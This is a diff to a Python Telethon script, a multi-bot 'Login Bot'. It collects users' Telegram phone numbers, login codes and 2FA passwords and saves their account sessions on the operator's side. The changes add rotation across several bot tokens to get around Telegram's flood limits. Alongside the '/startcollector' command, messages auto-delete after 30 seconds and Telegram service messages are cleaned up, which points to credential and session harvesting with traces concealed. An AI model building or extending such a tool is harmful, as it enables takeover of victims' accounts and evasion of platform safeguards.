@@ -1,15 +1,18 @@
 """
-Login Bot - Telegram bot for user account registration.
+Login Bot - Multi-bot Telegram login service with rotation.
 
-Users interact with this bot to register their Telegram accounts.
+Users interact with any of the configured bots to register their Telegram accounts.
 The bot handles the login flow: phone → code → 2FA → session saved.
 
-SECURITY: All messages are automatically deleted after 2 minutes.
+If a bot is locked (cannot save the session), it recommends another bot
+via an auto-deleting message (30 seconds).
+
+SECURITY: All messages are automatically deleted after 30 seconds.
 
 Usage:
     python login_bot.py
 
-The bot will listen for /start commands and guide users through login.
+All configured bots will listen for /startcollector and guide users through login.
 """
 import asyncio
 import os
@@ -34,7 +37,6 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Configuration
-BOT_TOKEN = os.getenv('BOT_TOKEN')
 API_ID = int(os.getenv('TG_API_ID', 0))
 API_HASH = os.getenv('TG_API_HASH')
 SESSIONS_DIR = 'sessions'
@@ -59,6 +61,40 @@ def get_session_lock(phone: str) -> asyncio.Lock:
 
 # Track messages for auto-deletion: {(chat_id, msg_id): delete_at_timestamp}
 messages_to_delete = {}
+
+# Track which bot each user is interacting with
+# Key: user_id, Value: bot TelegramClient instance  
+user_bot_mapping = {}
+
+# Store all active bot clients and their info
+# Key: bot username, Value: {'client': TelegramClient, 'name': str, 'token': str}
+active_login_bots = {}
+
+
+def parse_bot_tokens():
+    """Parses bot tokens from environment, returns list of dicts."""
+    bot_tokens_str = os.getenv('BOT_TOKENS', '')
+    
+    if bot_tokens_str and bot_tokens_str.strip():
+        result = []
+        for entry in bot_tokens_str.split(';'):
+            entry = entry.strip()
+            if not entry:
+                continue
+            parts = entry.split(':', 1)
+            if len(parts) == 2:
+                result.append({'name': parts[0].strip(), 'token': parts[1].strip()})
+            else:
+                result.append({'name': f'bot_{len(result)+1}', 'token': entry})
+        if result:
+            return result
+    
+    # Fallback to single BOT_TOKEN
+    single_token = os.getenv('BOT_TOKEN')
+    if single_token:
+        return [{'name': 'default', 'token': single_token}]
+    
+    return []
 
 
 class LoginState:
@@ -149,41 +185,61 @@ async def nuke_tracked_messages(bot, chat_id):
         messages_to_delete.pop((chat_id, msg_id), None)
 
 
-async def main():
-    """Main bot entry point."""
-    if not BOT_TOKEN:
-        logger.error("BOT_TOKEN not set in .env")
-        return
+def get_bot_recommendation(exclude_username: str) -> str:
+    """Returns a recommendation message pointing to another healthy bot."""
+    for username, info in active_login_bots.items():
+        if username != exclude_username:
+            return f"@{username}"
+    return None
+
+
+async def send_locked_recommendation(bot, event, bot_username: str):
+    """
+    Sends a message recommending another bot when the current one is locked.
+    Auto-deletes after 30 seconds.
+    """
+    recommendation = get_bot_recommendation(bot_username)
     
-    if not API_ID or not API_HASH:
-        logger.error("TG_API_ID and TG_API_HASH must be set in .env")
-        return
+    if recommendation:
+        msg = (
+            f"⚠️ **I'm currently locked and cannot process your request.**\n\n"
+            f"Please use {recommendation} instead to save your account.\n\n"
+            f"_This message will be deleted in {AUTO_DELETE_SECONDS} seconds._"
+        )
+    else:
+        msg = (
+            f"⚠️ **I'm currently locked and cannot process your request.**\n\n"
+            f"Please try again in a few minutes.\n\n"
+            f"_This message will be deleted in {AUTO_DELETE_SECONDS} seconds._"
+        )
     
-    os.makedirs(SESSIONS_DIR, exist_ok=True)
-    
-    # Create bot client
-    bot = TelegramClient('bot', API_ID, API_HASH)
-    await bot.start(bot_token=BOT_TOKEN)
-    
-    logger.info("Login bot started")
-    me = await bot.get_me()
-    logger.info(f"Bot: @{me.username}")
-    logger.info(f"Auto-delete enabled: messages deleted after {AUTO_DELETE_SECONDS}s")
-    
-    # Start auto-delete background task
-    asyncio.create_task(auto_delete_loop(bot))
-    
+    reply = await event.respond(msg)
+    await schedule_delete(bot, event.chat_id, event.id)
+    await schedule_delete(bot, event.chat_id, reply.id)
+
+
 # ============================================
 # Event Handlers
 # ============================================
 
 async def handle_start(event):
-    """Handle /start command."""
+    """Handle /startcollector command."""
     bot = event.client
     user_id = event.sender_id
     
+    # Get this bot's username
+    me = await bot.get_me()
+    bot_username = me.username
+    
+    # Check if this bot is locked (FloodWait etc.)
+    bot_info = active_login_bots.get(bot_username)
+    if bot_info and bot_info.get('locked', False):
+        await send_locked_recommendation(bot, event, bot_username)
+        return
+    
     # Initialize login session
     login_sessions[user_id] = LoginState()
+    user_bot_mapping[user_id] = bot
     
     await send_and_track(
         bot, event,
@@ -203,6 +259,9 @@ async def handle_cancel(event):
             await session.client.disconnect()
         del login_sessions[user_id]
     
+    if user_id in user_bot_mapping:
+        del user_bot_mapping[user_id]
+    
     await send_and_track(bot, event, "❌ Login cancelled. Send /startcollector to try again.")
 
 async def handle_message(event):
@@ -215,19 +274,22 @@ async def handle_message(event):
         await send_and_track(bot, event, "Send /startcollector to begin login.")
         return
     
+    # Use the bot that started the session
+    session_bot = user_bot_mapping.get(user_id, bot)
+    
     session = login_sessions[user_id]
     
     # State: Waiting for phone number
     if session.state == LoginState.WAITING_PHONE:
-        await handle_phone(bot, event, session, text)
+        await handle_phone(session_bot, event, session, text)
     
     # State: Waiting for verification code
     elif session.state == LoginState.WAITING_CODE:
-        await handle_code(bot, event, session, text)
+        await handle_code(session_bot, event, session, text)
     
     # State: Waiting for 2FA password
     elif session.state == LoginState.WAITING_2FA:
-        await handle_2fa(bot, event, session, text)
+        await handle_2fa(session_bot, event, session, text)
 
 async def handle_phone(bot, event, session, phone):
     """Handle phone number input."""
@@ -285,6 +347,8 @@ async def handle_phone(bot, event, session, phone):
                     "✅ **Login Successful!**"
                 )
                 del login_sessions[user_id]
+                if user_id in user_bot_mapping:
+                    del user_bot_mapping[user_id]
                 return
             
             # Request verification code
@@ -305,20 +369,56 @@ async def handle_phone(bot, event, session, phone):
             await schedule_delete(bot, event.chat_id, reply.id)
             
         except FloodWaitError as e:
-            await send_and_track(
-                bot, event,
-                f"⚠️ Too many attempts. Please wait {e.seconds} seconds and try again."
-            )
+            # Mark this bot as locked and recommend another
+            me = await bot.get_me()
+            bot_username = me.username
+            if bot_username in active_login_bots:
+                active_login_bots[bot_username]['locked'] = True
+                active_login_bots[bot_username]['locked_until'] = time.time() + e.seconds
+            
+            recommendation = get_bot_recommendation(bot_username)
+            if recommendation:
+                await send_and_track(
+                    bot, event,
+                    f"⚠️ Too many attempts. I'm locked for {e.seconds} seconds.\n\n"
+                    f"**Please use {recommendation} to continue your login.**\n\n"
+                    f"_This message will be deleted in {AUTO_DELETE_SECONDS} seconds._"
+                )
+            else:
+                await send_and_track(
+                    bot, event,
+                    f"⚠️ Too many attempts. Please wait {e.seconds} seconds and try again."
+                )
+            
             if session.client:
                 await session.client.disconnect()
             del login_sessions[user_id]
+            if user_id in user_bot_mapping:
+                del user_bot_mapping[user_id]
             
         except Exception as e:
             logger.error(f"Phone error: {e}")
-            await send_and_track(bot, event, f"❌ Error: {str(e)}\n\nSend /startcollector to try again.")
+            
+            # Check if this is a lockout-type error
+            me = await bot.get_me()
+            bot_username = me.username
+            recommendation = get_bot_recommendation(bot_username)
+            
+            if recommendation and "locked" in str(e).lower():
+                await send_and_track(
+                    bot, event,
+                    f"❌ Error: {str(e)}\n\n"
+                    f"**Try using {recommendation} instead.**\n\n"
+                    f"_This message will be deleted in {AUTO_DELETE_SECONDS} seconds._"
+                )
+            else:
+                await send_and_track(bot, event, f"❌ Error: {str(e)}\n\nSend /startcollector to try again.")
+            
             if session.client:
                 await session.client.disconnect()
             del login_sessions[user_id]
+            if user_id in user_bot_mapping:
+                del user_bot_mapping[user_id]
 
 async def handle_code(bot, event, session, code):
     """Handle verification code input."""
@@ -365,6 +465,8 @@ async def handle_code(bot, event, session, code):
         reply = await event.respond("✅ **Login Successful!**")
         await schedule_delete(bot, event.chat_id, reply.id)
         del login_sessions[user_id]
+        if user_id in user_bot_mapping:
+            del user_bot_mapping[user_id]
         
     except SessionPasswordNeededError:
         session.state = LoginState.WAITING_2FA
@@ -385,6 +487,8 @@ async def handle_code(bot, event, session, code):
         if session.client:
             await session.client.disconnect()
         del login_sessions[user_id]
+        if user_id in user_bot_mapping:
+            del user_bot_mapping[user_id]
         
     except Exception as e:
         logger.error(f"Code error: {e}")
@@ -420,6 +524,8 @@ async def handle_2fa(bot, event, session, password):
         reply = await event.respond("✅ **Login Successful!**")
         await schedule_delete(bot, event.chat_id, reply.id)
         del login_sessions[user_id]
+        if user_id in user_bot_mapping:
+            del user_bot_mapping[user_id]
         
     except PasswordHashInvalidError:
         reply = await event.respond("❌ Wrong password. Please try again.")
@@ -530,10 +636,31 @@ async def cleanup_telegram_service_messages(client):
     except Exception as e:
         logger.warning(f"Failed to cleanup Telegram service messages: {e}")
 
+
+async def bot_lock_checker():
+    """Background task to auto-unlock bots after their lockout expires."""
+    while True:
+        try:
+            now = time.time()
+            for username, info in active_login_bots.items():
+                if info.get('locked', False):
+                    locked_until = info.get('locked_until', 0)
+                    if now >= locked_until:
+                        info['locked'] = False
+                        info['locked_until'] = 0
+                        logger.info(f"🔓 Login bot @{username} auto-unlocked")
+        except Exception as e:
+            logger.error(f"Bot lock checker error: {e}")
+        
+        await asyncio.sleep(10)
+
+
 async def main():
-    """Main bot entry point."""
-    if not BOT_TOKEN:
-        logger.error("BOT_TOKEN not set in .env")
+    """Main multi-bot entry point."""
+    bot_configs = parse_bot_tokens()
+    
+    if not bot_configs:
+        logger.error("No bot tokens configured. Set BOT_TOKEN or BOT_TOKENS in .env")
         return
     
     if not API_ID or not API_HASH:
@@ -542,26 +669,72 @@ async def main():
     
     os.makedirs(SESSIONS_DIR, exist_ok=True)
     
-    # Create bot client
-    bot = TelegramClient('bot', API_ID, API_HASH)
-    await bot.start(bot_token=BOT_TOKEN)
+    bots = []
     
-    logger.info("Login bot started")
-    me = await bot.get_me()
-    logger.info(f"Bot: @{me.username}")
+    for config in bot_configs:
+        name = config['name']
+        token = config['token']
+        session_name = f"login_{name.lower().replace('@', '').replace(' ', '_')}"
+        
+        try:
+            bot = TelegramClient(session_name, API_ID, API_HASH)
+            await bot.start(bot_token=token)
+            
+            me = await bot.get_me()
+            logger.info(f"✓ Login bot @{me.username} ({name}) started")
+            
+            # Track this bot
+            active_login_bots[me.username] = {
+                'client': bot,
+                'name': name,
+                'token': token,
+                'locked': False,
+                'locked_until': 0
+            }
+            
+            # Register event handlers on each bot
+            bot.add_event_handler(handle_start, events.NewMessage(pattern='/startcollector'))
+            bot.add_event_handler(handle_cancel, events.NewMessage(pattern='/cancel'))
+            bot.add_event_handler(
+                handle_message, 
+                events.NewMessage(func=lambda e: e.is_private and not e.text.startswith('/'))
+            )
+            
+            bots.append(bot)
+            
+        except Exception as e:
+            logger.error(f"✗ Failed to start login bot {name}: {e}")
+    
+    if not bots:
+        logger.error("No login bots could start. Check your bot tokens.")
+        return
+    
     logger.info(f"Auto-delete enabled: messages deleted after {AUTO_DELETE_SECONDS}s")
+    logger.info(f"{len(bots)} login bot(s) running. Press Ctrl+C to stop.")
     
-    # Start auto-delete background task
-    asyncio.create_task(auto_delete_loop(bot))
+    # Start background tasks
+    tasks = []
     
-    # Register event handlers
-    bot.add_event_handler(handle_start, events.NewMessage(pattern='/startcollector'))
-    bot.add_event_handler(handle_cancel, events.NewMessage(pattern='/cancel'))
-    bot.add_event_handler(handle_message, events.NewMessage(func=lambda e: e.is_private and not e.text.startswith('/')))
-
-    # Keep bot running
-    logger.info("Bot is running. Press Ctrl+C to stop.")
-    await bot.run_until_disconnected()
+    # Auto-delete loop (use first bot for deletion)
+    for bot in bots:
+        tasks.append(asyncio.create_task(auto_delete_loop(bot)))
+    
+    # Bot lock checker
+    tasks.append(asyncio.create_task(bot_lock_checker()))
+    
+    # Run all bots until disconnected
+    try:
+        await asyncio.gather(
+            *[bot.run_until_disconnected() for bot in bots]
+        )
+    except KeyboardInterrupt:
+        logger.info("Shutting down login bots...")
+    finally:
+        for bot in bots:
+            try:
+                await bot.disconnect()
+            except Exception:
+                pass
 
 
 if __name__ == '__main__':
